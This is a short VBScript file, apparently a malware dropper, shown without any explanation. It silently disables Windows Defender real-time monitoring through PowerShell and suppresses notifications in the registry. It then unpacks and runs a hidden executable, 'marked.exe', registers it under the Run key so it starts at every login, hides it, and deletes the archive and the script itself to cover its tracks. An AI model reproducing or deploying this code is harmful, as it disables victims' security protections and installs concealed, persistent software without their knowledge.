Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run "powershell -NoProfile -ExecutionPolicy Bypass -Command Set-MpPreference -DisableRealtimeMonitoring $true", 0
objShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\PushNotifications\NoToastApplicationNotification", 1, "REG_DWORD"
WScript.Sleep 5000

Set objFSO = CreateObject("Scripting.FileSystemObject")
currentDir = objFSO.GetParentFolderName(WScript.ScriptFullName)
objShell.CurrentDirectory = currentDir

objShell.Run "tar -xvzf main.tar.gz", 0
WScript.Sleep 1000
objShell.Run "marked.exe", 0
objShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\MarkedScript", "marked.exe"


objShell.Run "powershell.exe -Command Remove-Item -Path 'main.tar.gz' -Force", 0
objShell.Run "attrib +h marked.exe", 0
objShell.Run "powershell.exe -Command Remove-Item -Path 'marked.vbs' -Force", 0